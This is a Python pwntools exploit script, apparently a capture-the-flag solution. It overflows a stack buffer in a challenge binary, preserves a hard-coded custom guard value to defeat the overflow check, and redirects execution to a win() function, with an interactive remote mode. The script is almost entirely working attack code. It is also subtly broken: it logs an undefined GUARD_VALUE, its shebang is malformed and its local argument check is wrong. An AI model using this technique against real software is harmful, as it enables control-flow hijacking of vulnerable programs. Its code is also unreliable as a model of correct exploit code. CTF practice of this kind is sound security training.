#!usr/bin/env python3

"""
Stack Overflow - Canary Bypass Exploit
S&G Tech CTF Challenge Solution

This exploit overwrites the return address of greet() to redirect execution to win(), while preserving the custom stack guard value to bypass the "stack smashing detected" check.
"""

from pwn import *

# ============================================================
# Configuration
# ============================================================

context.log_level = 'info'

# Remote connection settings
REMOTE_HOST = 'localhost'
REMOTE_PORT = 1337

# ============================================================
# Exploit Parameters
# ============================================================

# Buffer size in greet() function
BUFFER_SIZE = 64

# The custom canary guard value from the source (or found via reversing)
CANARY_VALUE = 0xDEADBEEFDEADC0DE

# Stack layouf of greet():
# +----------------------------+ (higher addresses)
# | return address    (8 bytes)| offset 80
# +----------------------------+
# | saved RBP         (8 bytes)| offset 72
# +----------------------------+
# | guard             (8 bytes)| offset 64 <- must equal GUARD_VALUE
# +----------------------------+
# | name[64]          (64 bytes)| offset 0 <- our input starts here
# +----------------------------+ (lower addresses / RSP)

OFFSET_TO_GUARD = 64
OFFSET_TO_RET = 80

# ============================================================
# Exploit Functions
# ============================================================

def create_payload(win_addr):
    """
    Create the exploit payload.
    
    Key Point: a guard variable sits between the buffer and saved RBP.
    If we blindly overflow with 'A's, the guard check fails and exit() is 
    called before we reach the ret isntruction. We must write the correct 
    guard value at the right offset.
    
    Payload structure:
    [64 bytes padding] + [8 bytes guard value] + [8 bytes saved RBP] + [8 bytes win() addr]
    """
    
    payload = b'A' * BUFFER_SIZE            # Fill the name buffer
    payload += p64(CANARY_VALUE)            # Preserve the guard (bypass the check)
    payload += b'B' * 8                     # Overwrite saved RBP
    payload += p64(win_addr)                # Overwrite return address with win()
    return payload  

def exploit_local(binary_path):
    """Run the exploit against the local binary."""
    elf = ELF(binary_path)
    context.binary = binary_path
    win_addr = elf.symbols['win']
    
    log.info("Starting local exploit...")
    p = process(binary_path)
    
    payload = create_payload(win_addr)
    log.info(f"Payload length: {len(payload)} bytes")
    log.info(f"Guard value: {hex(GUARD_VALUE)}")
    log.info(f"win() address: {hex(win_addr)}")
    
    p.recvuntil(b'Enter your name: ')
    p.sendline(payload)
    
    p.recvline()    # "Hello, AAAA...!"
    response = p.recvall(timeout=2)
    
    print("\n" + "=" * 50)
    print(response.decode(errors='ignore'))
    print("=" * 50)
    
    p.close()

def exploit_remote(binary_path=None):
    """Run the exploit against the remote server."""
    if binary_path:
        elf = ELF(binary_path)
        win_addr = elf.symbols['win']
    else:
        # If no binary available, hardcode the address (find with objdump)
        win_addr = 0x401196     # UPDATE THIS from: objdump -d vuln | grep "<win>"
    
    log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}...")
    p = remote(REMOTE_HOST, REMOTE_PORT)
    
    payload = create_payload(win_addr)
    log.info(f"Payload length: {len(payload)} bytes")
    log.info(f"Guard value: {hex(GUARD_VALUE)}")
    log.info(f"win() address: {hex(win_addr)}")
    
    p.recvuntil(b'Enter your name: ')
    p.sendline(payload)
    
    p.interactive()
    
# ============================================================
# Main
# ============================================================

if __name__ == "__main__":
    import sys
    
    print("S&G Tech CTF Challenge")
    print("Stack Overflow")
    print()
    
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        binary = sys.argv[2] if len(sys.argv) > 2 else None
        exploit_remote(binary)
    else:
        binary = sys.argv[1] if len(sys.argv) > 2 else '../vuln'
        exploit_local(binary)